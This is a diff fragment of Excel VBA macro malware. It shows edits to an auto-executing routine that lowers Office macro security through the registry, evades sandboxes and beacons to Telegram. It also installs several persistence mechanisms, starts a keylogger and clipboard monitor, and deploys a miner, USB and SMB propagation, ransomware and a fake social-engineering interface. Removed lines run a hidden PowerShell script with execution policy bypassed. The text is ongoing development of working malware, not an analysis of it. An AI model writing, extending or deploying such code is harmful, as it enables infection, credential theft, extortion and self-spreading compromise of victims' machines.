-    Dim psFile As String: psFile = GetTempDir() & "email.ps1"
-    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
-    Dim f As Object: Set f = fso.CreateTextFile(psFile, True): f.Write psScript: f.Close
-    CreateObject("WScript.Shell").Run "powershell -ep bypass -File """ & psFile & """", 0, True
-    StealthSleep 3000
-    fso.DeleteFile psFile
-End Sub
+' ========================
+' EMAIL PROPAGATION – REMOVED (Gmail blocks basic auth)
+' ========================
 
 ' ========================
 ' CHROME REMOTE DESKTOP
@@ -1003,10 +1114,11 @@ Sub PersistAll()
     PersistScheduledTask
     PersistCOMHijack
     PersistStartupFolder
+    InstallPersistentLauncher
 End Sub
 
 ' ========================
-' MAIN EXECUTION (NON‑BLOCKING)
+' MAIN EXECUTION (NON‑BLOCKING, EFFICIENT WAIT)
 ' ========================
 Sub AutoExec()
     On Error GoTo ErrorHandler
@@ -1025,7 +1137,6 @@ Sub AutoExec()
         wsh.RegWrite "HKCU\Software\Microsoft\Office\16.0\Excel\Security\VBAWarnings", 1, "REG_DWORD"
         wsh.RegWrite "HKCU\Software\Microsoft\Office\15.0\Excel\Security\AccessVBOM", 1, "REG_DWORD"
         wsh.RegWrite "HKCU\Software\Microsoft\Office\15.0\Excel\Security\VBAWarnings", 1, "REG_DWORD"
-        ' Do not restart – just continue
     End If
     
     If IsSandbox() Then Exit Sub
@@ -1036,10 +1147,10 @@ Sub AutoExec()
     GenerateMasterKey
     SendToTelegram "LAZARUS_START|" & GetMachineID()
     
-    ' Install persistence (does not block)
+    ' Install persistence
     PersistAll
     
-    ' Start non‑blocking polling keylogger
+    ' Start keylogger
     Application.OnTime Now + TimeValue("00:00:00.05"), "PollingKeylogger"
     
     If IsDomainController() Then
@@ -1051,19 +1162,18 @@ Sub AutoExec()
         DeployMiner
         USBPropagation
         SMBPropagation
-        EmailPropagation
+        ' Email propagation removed
         RunRansomware
         DeploySocialEngineeringUI
-        ' Start non‑blocking clipboard monitor
         Application.OnTime Now + TimeValue("00:00:00.5"), "ClipboardMonitorLoop"
     End If
     
-    ' Hide Excel and keep it alive
+    ' Hide Excel and keep it alive efficiently
     Application.Visible = False
     ThisWorkbook.Saved = True
     Do While True
         DoEvents
-        Sleep 100
+        Application.Wait Now + TimeValue("00:00:01")   ' 1 second pause – reduces CPU
     Loop
     Exit Sub
 ErrorHandler:
